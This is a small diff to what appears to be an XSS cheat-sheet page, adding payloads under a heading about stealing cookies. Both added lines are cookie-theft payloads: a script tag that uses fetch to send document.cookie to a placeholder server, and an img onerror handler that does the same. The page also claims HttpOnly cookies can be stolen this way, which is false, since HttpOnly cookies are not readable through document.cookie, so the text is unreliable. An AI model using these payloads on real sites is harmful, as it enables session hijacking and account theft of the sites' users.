@@ -16,4 +16,5 @@ pagetitle: XSS
 
 
 Cookies with HttpOnly can be stolen with XSS
-- `<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>`
+- `<script>fetch('http://{server}?c='+document.cookie)</script>`
+- `<img src=x onerror=this.src='http://{server}/?c='+document.cookie>`
